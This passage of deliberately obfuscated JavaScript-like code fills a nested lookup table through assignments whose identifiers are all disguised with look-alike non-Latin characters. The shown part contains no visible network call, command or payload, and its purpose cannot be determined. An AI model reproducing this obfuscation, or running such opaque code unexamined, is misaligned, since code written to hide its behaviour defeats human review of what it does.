			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[147])] = ⲆΔ.ⲆᐃᐃᐃⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[ⲆⲆΔⵠᐃ])] = ⲆΔ.ⲆⲆⲆⵠⵠᐃΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[467])] = ⲆΔ.ⵠΔᐃⵠΔⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[405])] = ⲆΔ.ΔΔⵠⵠⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[146])] = ⲆΔ.ᐃᐃΔΔⵠᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[418])] = ⲆΔ.ⲆᐃⲆᐃⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[202])] = ⲆΔ.ⲆᐃⵠᐃⵠΔⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[477])] = ⲆΔ.ᐃᐃΔᐃⵠⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[228])] = ⲆΔ.ᐃⲆⵠΔΔⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[269])] = ⲆΔ.ΔᐃᐃⵠΔⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[195])] = ⲆΔ.ⵠᐃᐃᐃⲆΔⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[376])] = ⲆΔ.ⵠⵠᐃⲆΔⲆΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[89])] = ⲆΔ.ⲆᐃⵠⲆⵠⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[521])] = ⲆΔ.ᐃⲆⵠⵠⲆΔᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[411])] = ⲆΔ.ⵠᐃΔᐃⵠΔΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[141])] = ⲆΔ.ⲆΔⲆΔᐃⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[494])] = ⲆΔ.ᐃΔᐃᐃⵠΔΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[199])] = ⲆΔ.ⲆᐃΔⵠⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[494])] = ⲆΔ.ᐃΔᐃᐃⵠΔΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[135])] = ⲆΔ.ⲆⲆⵠⵠⵠⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[506])] = ⲆΔ.ΔΔⲆⲆᐃⲆΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[121])] = ⲆΔ.ᐃΔΔΔᐃΔⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[461])] = ⲆΔ.ⲆⲆⵠᐃⵠⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[133])] = ⲆΔ.ΔᐃⲆᐃⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[318])] = ⲆΔ.ⵠⲆⲆⲆᐃⲆΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[482])] = ⲆΔ.ⲆᐃᐃⵠᐃⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[298])] = ⲆΔ.ᐃΔⵠΔᐃⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[282])] = ⲆΔ.ⵠⵠᐃⵠⲆⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[367])] = ⲆΔ.ⲆⵠⲆᐃΔᐃⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[209])] = ⲆΔ.ΔᐃⲆᐃⲆΔⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[90])] = ⲆΔ.ⲆⲆⲆⵠⲆᐃⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[27])] = ⲆΔ.ΔᐃᐃΔᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[276])] = ⲆΔ.ⲆⵠᐃᐃΔΔⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[67])] = ⲆΔ.ⵠⵠᐃᐃᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[501])] = ⲆΔ.ⵠⵠⲆⲆⲆⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[50])] = ⲆΔ.ᐃΔᐃⲆⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[277])] = ⲆΔ.ᐃⲆᐃΔⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[52])] = ⲆΔ.ⲆⵠᐃⲆⵠᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[278])] = ⲆΔ.ᐃᐃΔⲆⵠⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[236])] = ⲆΔ.ΔΔⲆⵠΔΔΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[47])] = ⲆΔ.ΔᐃⲆΔⲆⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[290])] = ⲆΔ.ⲆⵠⵠⲆΔΔΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[14])] = ⲆΔ.ᐃⲆⲆᐃⵠⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[211])] = ⲆΔ.ᐃⵠᐃⲆᐃⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[557])] = ⲆΔ.ΔΔΔᐃᐃΔᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[120])] = ⲆΔ.ⲆᐃᐃⵠⲆΔΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[125])] = ⲆΔ.ΔⵠⵠⲆᐃⲆΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[161])] = ⲆΔ.ᐃᐃᐃⲆⲆⲆΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[147])] = ⲆΔ.ⵠⲆᐃⵠⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[13])] = ⲆΔ.ΔⲆⲆᐃΔᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[467])] = ⲆΔ.ⵠⵠᐃΔⲆΔⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[405])] = ⲆΔ.ᐃⲆⲆⲆᐃᐃⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[146])] = ⲆΔ.ⵠⵠⲆⵠⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[418])] = ⲆΔ.ᐃᐃΔⵠΔΔⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[202])] = ⲆΔ.ⵠΔᐃⲆᐃⵠΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[477])] = ⲆΔ.ᐃⵠΔⵠΔⲆΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[228])] = ⲆΔ.ΔᐃⲆᐃΔⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[269])] = ⲆΔ.ⵠΔΔᐃⵠΔΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[195])] = ⲆΔ.ⲆᐃⲆᐃᐃΔⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[376])] = ⲆΔ.ΔⵠᐃⵠΔⲆΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[89])] = ⲆΔ.ⲆⲆΔᐃΔᐃᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[521])] = ⲆΔ.ⵠᐃΔⵠΔⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[411])] = ⲆΔ.ⵠΔⲆΔΔⵠΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[141])] = ⲆΔ.ⲆᐃⵠⵠᐃΔᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[494])] = ⲆΔ.ΔΔⵠΔΔⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[199])] = ⲆΔ.ⵠⵠΔⵠⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[494])] = ⲆΔ.ΔΔⵠΔΔⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[135])] = ⲆΔ.ⲆⵠⲆΔⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[506])] = ⲆΔ.Ⲇᐃⵠⵠᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[121])] = ⲆΔ.ⵠⲆΔⵠΔⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆᐃΔⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠΔΔⲆⵠⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃΔⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠᐃⵠⵠᐃΔ;
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔΔⵠⵠᐃΔⵠ;
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃΔⵠᐃⲆΔΔ;
			ⵠⲆ[Ⲇ.ⵠⵠⵠⵠⵠᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⵠⵠⵠᐃΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆΔᐃᐃᐃᐃᐃ;
			ⵠⲆ[Ⲇ.ⵠⵠⵠⵠⵠᐃΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠΔᐃΔⵠᐃⲆ;
			ⵠⲆ[Ⲇ.ᐃⲆⲆᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⲆᐃⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⲆⲆⵠΔⲆΔ;
			ⵠⲆ[Ⲇ.ᐃⲆⲆᐃⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔΔᐃΔⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆΔΔⵠΔᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆΔΔⵠΔᐃᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆΔⲆᐃⵠᐃΔ;
			ⵠⲆ[Ⲇ.ⲆΔΔⵠΔᐃᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠΔΔΔⲆⵠ;
			ⵠⲆ[Ⲇ.ᐃᐃΔⲆⲆᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃΔⲆⲆᐃⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆᐃⲆⲆΔΔΔ;
			ⵠⲆ[Ⲇ.ᐃᐃΔⲆⲆᐃⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⵠⲆⲆⵠΔⵠ;
			ⵠⲆ[Ⲇ.ΔΔΔᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ΔΔΔᐃⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⵠᐃΔΔⵠΔ;
			ⵠⲆ[Ⲇ.ΔΔΔᐃⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃΔᐃⵠⵠⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠⵠᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆΔᐃⵠⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠⵠᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆⲆⲆⲆⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ⲆⲆⲆᐃᐃΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⲆᐃᐃΔᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠᐃⵠᐃⵠⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆⲆⲆᐃᐃΔᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃΔⲆⵠⲆᐃ;
			ⵠⲆ[Ⲇ.ΔⵠⵠΔᐃⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⵠΔᐃⲆⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠᐃᐃⲆᐃⲆΔ;
			ⵠⲆ[Ⲇ.ΔⵠⵠΔᐃⲆⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠᐃᐃᐃᐃᐃⲆ;
			ⵠⲆ[Ⲇ.ⵠᐃΔᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃΔᐃΔ][Ⲇ.ⲆⵠΔ] = [ⲆΔ.ᐃᐃⲆⵠᐃⵠⵠ];
			ⵠⲆ[Ⲇ.ⵠᐃΔᐃΔ][Ⲇ.ΔⲆΔ] = [ⲆΔ.ᐃᐃⲆⵠⵠⲆⵠ];
			ⵠⲆ[Ⲇ.ΔᐃΔᐃⵠ] = [], ⵠⲆ[Ⲇ.ΔᐃΔᐃⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃᐃΔⲆᐃⲆⲆ;
			ⵠⲆ[Ⲇ.ΔᐃΔᐃⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⵠΔⵠⵠᐃⲆ;
			ⵠⲆ[Ⲇ.ⵠᐃⲆᐃⲆ] = [], ⵠⲆ[Ⲇ.ⵠᐃⲆᐃⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠᐃⵠᐃⲆΔᐃ;
			ⵠⲆ[Ⲇ.ⵠᐃⲆᐃⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔⲆⲆᐃᐃΔ;
			ⵠⲆ[Ⲇ.ⵠⲆΔΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔΔⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⲆⵠᐃⵠⵠⲆ;
			ⵠⲆ[Ⲇ.ⵠⲆΔΔⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠⲆⵠⵠΔΔ;
			ⵠⲆ[Ⲇ.ᐃᐃΔΔⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃΔΔⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⲆⵠⵠΔΔᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃΔΔⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔᐃⵠⵠⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆⲆΔⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆΔⵠⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠᐃⵠΔⲆᐃⲆ;
			ⵠⲆ[Ⲇ.ⲆⲆΔⵠⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃⲆᐃⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆᐃΔΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃΔΔⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠᐃⲆᐃΔⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆᐃΔΔⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃᐃᐃᐃᐃΔⵠ;
			ⵠⲆ[Ⲇ.ⲆⵠⲆᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆᐃᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⵠⲆⲆΔᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆⵠⲆᐃᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔᐃⲆⲆΔⲆᐃ;
			ⵠⲆ[Ⲇ.ⵠΔⵠᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⵠᐃⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⲆΔΔⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ⵠΔⵠᐃⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔΔⲆⵠⵠⲆ;
			ⵠⲆ[Ⲇ.ⵠⵠⲆΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⲆΔⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔΔⵠⲆΔⲆᐃ;
			ⵠⲆ[Ⲇ.ⵠⵠⲆΔⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⲆΔᐃⲆⲆⲆ;
			ⵠⲆ[Ⲇ.ᐃΔΔⵠᐃᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃΔΔⵠᐃᐃⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.Ⲇᐃⵠⵠᐃᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃΔΔⵠᐃᐃⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠⵠΔᐃᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆΔⲆᐃᐃⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆΔⲆᐃᐃⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⲆΔⲆⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⲆΔⲆᐃᐃⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃΔⲆᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ΔΔΔⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔΔΔⵠΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠᐃᐃᐃⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ΔΔΔⵠΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⲆΔΔᐃⲆΔ;
			ⵠⲆ[Ⲇ.ΔⲆⲆΔΔᐃⲆ] = ⲆΔ.ΔⲆⲆΔΔᐃⲆ;
			ⵠⲆ[Ⲇ.ΔΔᐃⵠⲆᐃⵠ] = ⲆΔ.ΔΔᐃⵠⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔᐃ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔᐃ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⵠΔⵠΔᐃΔᐃ);
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⵠⵠᐃⵠⲆⲆΔ);
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃᐃⵠΔᐃⵠⵠ);
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⲆΔⲆᐃⵠΔⲆ);
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠⵠᐃᐃⵠⲆⵠ);
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ᐃⲆΔⵠⵠᐃᐃ);
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆΔ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆΔ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆΔ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ΔΔΔᐃᐃΔΔ);
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆΔ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⵠΔⵠⲆᐃΔΔ);
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆΔ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ΔⵠΔΔΔⵠⵠ);
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆΔ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠⲆⲆΔⲆᐃΔ);
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆΔ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠᐃⵠᐃⵠⵠᐃ);
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆΔ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠⲆΔΔᐃⵠⵠ);
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⵠⲆⲆⵠᐃᐃⲆ);
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ΔΔᐃⲆⵠⵠⲆ);
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⵠⵠᐃⲆᐃⵠᐃ);
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⵠⵠΔΔⲆⲆΔ);
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃⲆⵠᐃⲆΔᐃ);
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⲆⲆⲆⲆᐃᐃΔ);
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠⲆΔⲆⲆⲆⲆ);
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ΔΔⵠⵠΔᐃⵠ);
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ᐃⲆΔⲆⲆⵠᐃ);
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠⲆΔᐃᐃⵠΔ);
			ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃᐃⵠⲆΔᐃΔ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔᐃⲆⵠⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠΔᐃⵠΔᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠΔᐃⵠΔᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔΔⵠΔⲆᐃⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠΔᐃⵠΔᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔⵠⵠΔⲆΔ;
			ⵠⲆ[Ⲇ.ΔΔⵠᐃᐃΔⲆ] = [];
